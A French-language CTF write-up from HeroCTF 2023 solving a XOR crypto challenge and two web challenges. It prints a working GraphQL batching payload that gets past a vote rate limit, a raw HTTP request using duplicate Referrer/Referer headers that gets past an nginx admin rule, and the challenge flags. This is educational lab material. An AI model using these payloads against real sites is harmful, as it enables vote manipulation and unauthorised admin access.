# HeroCTF_WriteUp

Premier writeup de mes débuts dans le monde du CTF, lors du HeroCTF se déroulant du 12 au 14 mai 2023, merci aux organisateurs c’était cool ! Place de la team à la fin du CTF : 73/1085 c’est plutôt encourageant pour la suite !

<p align="center">
  <img src="https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/cea372db-d925-40fd-8fcb-47f6c6a790e9" alt="team">
</p>

# Sommaire
- [Crypto](#crypto)
- [Web](#web)
  
# Crypto

## Hyper Loop

Premier challenge de cryptographie, on nous donne le code suivant :

```python
from os import urandom


flag = bytearray(b"Hero{????????????}")
assert len(flag) == 18

for _ in range(32):
    for i, c in enumerate(urandom(6) * 3):
        flag[i] = flag[i] ^ c

print(f"{flag = }")


"""
$ python3 hyper_loop.py 
flag = bytearray(b'\x05p\x07MS\xfd4eFPw\xf9}%\x05\x03\x19\xe8')
"""
```

À la vue du code on peut directement voir qu’un XOR est effectué sur chaque caractère du flag à partir d’une clé de 6 bytes générée aléatoirement, et répété 3 fois, ce qui couvre 18 bytes, donc la taille du flag.

Le XOR est une opération effectuée sur les bits de 2 valeurs. Si la comparaison montre que les deux bits sont identiques, le résultat sera false | 0 et s’ils sont différents, le XOR renvoie true | 1  :

```
01000001   (A ou 65)
XOR
01000010   (B ou 66)
--------
00000011   (3)
```

Le truc cool c’est que le XOR est reversible, par exemple un XOR entre 3 et 66 donnera 65.

En commentaire du code on retrouve le cipher du flag sous forme de bytes. Si on retrouve la clé, qu’on effectue un XOR entre la clé et les valeurs, on peut reconstituer le flag. Ça tombe bien puisque la clé est de 6 bytes, et que 6 caractères sont déjà visibles dans le message plus haut sous cette forme : **Hero{????????????}**

On a plus qu’à reconstituer la clé en faisant un XOR entre les valeurs ascii du message, et le cipher converti en valeur décimale.

Pour convertir le cipher en valeur décimale :

```python
flag = bytearray(b'\x05p\x07MS\xfd4eFPw\xf9}%\x05\x03\x19\xe8')

flag_decimal = [byte for byte in flag]
print(flag_decimal)
```

Voici le résultat : **[129, 99, 52, 1, 135, 84, 238, 31, 226, 8, 57, 110, 144, 10, 219, 12, 190, 102, 57, 42, 163, 84, 221, 21, 128, 102, 126, 16, 139, 70, 163]**

On XOR les 5 premières valeurs ainsi que la dernière avec les caractères visibles, on obtient la clé suivante : **77 21 117 34 40 149**

Maintenant, on reverse le XOR en utilisant cette clé sur le cipher pour obtenir le message en clair, je suis passé par mon [script python](https://github.com/Sleleu/xorcipher/blob/main/xorcipher.py) pour éviter de le faire à la mano : 

Et on obtient le flag !

<p align="center">
<img src="https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/56671346-f42a-495e-8538-5ae78fbf3e97" />
</p>

# Web

## **1 - Best schools**

On tombe sur un site de ranking d'écoles de cybersecurité.
L'objectif est de trouver un moyen faire passer la Flag Cybersecurity School en première position, la première ayant initialement déjà 1337 votes :

<p align="center">
<img src="https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/e9aec5db-5cab-4ed5-bb13-35ded98f9328" />
</p>

À chaque nouveau clic, le nombre de vote s’incrémente.
Le problème étant qu’on ne peut cliquer qu’une fois toutes les 2 minutes environ sous peine de se retrouver avec cette popup :

<p align="center">
<img src="https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/aade9466-226a-422f-9246-cbab94b817e8" />
</p>

Deux options s’offrent à nous :

- Passer 44 heures à cliquer toutes les 2 minutes pour obtenir les 1338 votes nécessaires
- Hack cette merde 🙂

En fouillant le code source du site on remarque une fonction intéressante :

```javascript
function updateNbClick(schoolName)
{
    var updated_school = [];
    fetch("/graphql", {
        method: "POST",
        headers:{
                "Content-Type": "application/json",
                "Accept": "application/json"
            },
            body: JSON.stringify({query: `mutation { increaseClickSchool(schoolName: "${schoolName}"){schoolId, nbClick} }`})
    }).then(r => r.json())
    .then(
        function(data)
        {
            if(data.error != undefined)
            {
                alert(data.error)
            }
            document.getElementById(`click${data.data.increaseClickSchool.schoolId}`).innerHTML = data.data.increaseClickSchool.nbClick
        }
    )
}
```
C’est cette fonction côté client qui permet d’incrémenter le vote, et plus précisément après quelques recherches,
c’est cette mutation **************graphql************** qui fait le taff :

```javascript
mutation { increaseClickSchool(schoolName: "${schoolName}"){schoolId, nbClick} }
```
Ok, alors la variable nbClicks est inaccessible, et on ne peut pas envoyer plusieurs requêtes d’un seul coup.
Est-ce qu’il y aurait un moyen de bypass la limite de temps pour les requêtes ?
Après maintes tentatives et un harcèlement de GooglexChatgpt, j'ai pu trouver qu’il existait un type d’attaque pour ça : une attaque par lot, ou [GraphQL Batching Attack](https://lab.wallarm.com/graphql-batching-attack/). Pour la théorie, je vais laisser chatgpt expliquer pour moi : 

Un exemple typique d'une attaque par lots (batching attack) en GraphQL pourrait ressembler à ceci:

Imaginons que nous avons une application qui permet aux utilisateurs de chercher des livres dans une bibliothèque en ligne. L'application utilise GraphQL, et elle a une requête qui ressemble à ceci

```javascript
query {
  book(id: "123") {
    title
    author
    publishedDate
  }
}
```

Cette requête demande des informations sur un livre spécifique.

Maintenant, un attaquant pourrait tenter de surcharger le serveur en envoyant une requête qui demande des informations sur des milliers de livres à la fois, comme ceci :

```javascript
query {
  first: book(id: "1") { title }
  second: book(id: "2") { title }
  third: book(id: "3") { title }
  ...
  thousandth: book(id: "1000") { title }
}
```
Parfait, sans vouloir surcharger le serveur nous ce qui nous intéresse c’est d’incrémenter plusieurs fois le nombre de cliques en une unique requête. Go tester ça ?

```javascript
var mutationQuery = `mutation { 
    a: increaseClickSchool(schoolName: "Flag CyberSecurity School"){schoolId, nbClick}
    b: increaseClickSchool(schoolName: "Flag CyberSecurity School"){schoolId, nbClick}
  }`;
  
  fetch("/graphql", {
    method: "POST",
    headers:{
      "Content-Type": "application/json",
      "Accept": "application/json"
    },
    body: JSON.stringify({query: mutationQuery})
  });
```
Ça marche ! On a bien augmenté le nombre de clics de 2 en une seule requête. Le problème est que pour une mutation graphql, chaque instruction nécessite un nom et j’ai pas envie d’écrire 1000 noms random en C/C, 
donc petite boucle et ça part en first du classement des écoles ?

```javascript
var mutationQuery = 'mutation {';

  for(var i = 0; i < 1400; i++) {
    mutationQuery += `name${i}: increaseClickSchool(schoolName: "Flag CyberSecurity School"){schoolId, nbClick} `;
  }
  
  mutationQuery += '}';
  
  fetch("/graphql", {
    method: "POST",
    headers:{
      "Content-Type": "application/json",
      "Accept": "application/json"
    },
    body: JSON.stringify({query: mutationQuery})
  });
```
Erreur 413 Payload Too Large en sanction… Essayons avec seulement 1000 itérations dans ce cas :

<p align="center">
<img src="https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/a57aa508-ba73-4beb-a434-c475ba26eade" />
</p>

zuuuper 🥵🥵🥵🥵🥵🥵🥵🥵🥵🥵🥵🥵

Il ne manque plus qu’à attendre 2 minutes, relancer le même payload, et récupérer le flag directement sur le site: **Hero{gr4phql_b4tch1ng_t0_byp4ss_r4t3_l1m1t_!!}**

## 2 - Referrrrer

Dans ce challenge, on dispose des fichiers sources du site web, dont le serveur nginx en premier lieu :

```
http {
    charset utf-8;

    access_log /dev/stdout;
    error_log /dev/stdout;

    upstream express_app {
        server app:3000;
    }

    server {
        listen 80;
        server_name example.com;

        location / {
            proxy_pass http://express_app;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
        }

        location /admin {
            if ($http_referer !~* "^https://admin\.internal\.com") {
                return 403;
            }

            proxy_pass http://express_app;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
        }
    }
}
```

Puis le serveur express :

```javascript
const express = require("express")
const app = express()


app.get("/", (req, res) => {
    res.send("Hello World!");
})

app.get("/admin", (req, res) => {
    if (req.header("referer") === "YOU_SHOUD_NOT_PASS!") {
        return res.send(process.env.FLAG);
    }

    res.send("Wrong header!");
})

app.listen(3000, () => {
    console.log("App listening on port 3000");
})
```

On peut deviner que la vulnérabilité se situe au niveau du referer vu le nom du challenge, encore plus obvious sur la faille avec le refe**rrrrrrrrr**er bien insistant, mais ça je ne l’ai pas vu car je lis tout en diagonale.

Le referer c’est quoi ? C’est un header http, permettant d’indiquer dans la requête l’URL de provenance. Si tu es sur une page http://salut.fr/yo1, et que sur cette page il y a un bouton pour accéder à une page /yo2 la requête vers la page /yo2 contiendra en referer l’url de la page précédente /yo1.

Facile, il suffit donc d’indiquer le bon referer en accédant à la route /admin dans ce cas. J’ouvre **Burpsuite**, une petite requête vers le site du challenge passant par le proxy, je l’envoie dans le Repeater.

Premier problème, si j’envoie en Referer :

```
Referer:https://admin.internal.com
```

Le serveur Express évaluera sa condition à false et renverra "Wrong header!".

Et si je passe le bon referer pour Express :

```
Referer:YOU_SHOUD_NOT_PASS!
```

C’est nginx qui me répondra par un Forbidden 403.

L’idée est donc de valider ces deux conditions à la fois. En cherchant des infos en rapport avec le referer et express, on peut déjà voir en faisant un check de la documentation + CTRL F ‘referer’ que :


<p align="center">
<img src="https://github.com/Sleleu/HeroCTF_WriteUp/assets/93100775/a8278120-a499-44e4-8491-882897860562" />
</p>

Ok ils sont interchangeables pour Express, donc on peut mettre un referer nginx et un referrer express ? On tombe vite sur cette issue github qui apporte plus d’infos sur ce cas : https://github.com/expressjs/express/issues/3951

Il semble que le terme refe**rr**er est recherché en priorité par Express, et en fouillant le code source de [request.js](https://github.com/expressjs/express/blob/master/lib/request.js#L79), on voit effectivement cette priorité :

```javascript
switch (lc) {
    case 'referer':
    case 'referrer':
      return this.headers.referrer
        || this.headers.referer;
    default:
      return this.headers[lc];
  }
};
```
Testons donc ça tout de suite sur Burpsuite :

```http
GET /admin HTTP/1.1
Host: static-01.heroctf.fr:7000
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Referrer:YOU_SHOUD_NOT_PASS!
Referer:https://admin.internal.com
Content-Length: 23


Connection: close
```

On obtient finalement le flag en réponse !

```http
HTTP/1.1 200 OK
Server: nginx/1.24.0
Date: Sat, 13 May 2023 13:20:26 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 38
Connection: keep-alive
X-Powered-By: Express
ETag: W/"26-Cj1P1GdO8Vke/DfJFC3B2cH95nw"

Hero{ba7b97ae00a760b44cc8c761e6d4535b}
```


